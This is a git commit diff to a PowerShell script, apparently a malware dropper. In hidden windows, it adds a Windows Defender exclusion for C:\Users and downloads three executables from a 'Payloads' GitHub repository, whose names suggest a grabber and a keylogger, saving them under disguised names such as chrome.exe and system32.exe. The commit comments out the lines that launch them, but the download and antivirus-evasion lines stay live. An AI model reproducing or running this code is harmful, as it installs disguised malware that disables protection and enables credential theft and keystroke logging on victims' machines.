fa06adf5c760e9e714828aedc4ffb12c60463688
rude90 <115774095+rude90@users.noreply.github.com>
2023-10-31 06:59:22 +0500

    Update py_script_testing.ps1

--- py_script_testing.ps1
+++ py_script_testing.ps1
@@ -6,13 +6,13 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Cplus-grabber.exe -o C:\Users\chrome.exe
-powershell.exe -w Hidden C:\Users\chrome.exe
+# powershell.exe -w Hidden C:\Users\chrome.exe
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/NAZPAT.exe -o C:\Users\system32.exe
-powershell.exe -w Hidden C:\Users\system32.exe
+# powershell.exe -w Hidden C:\Users\system32.exe
 
 powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/keyboard-new.exe -o C:\Users\runtime.exe
-powershell.exe -w Hidden C:\Users\runtime.exe
+# powershell.exe -w Hidden C:\Users\runtime.exe
 
 
 
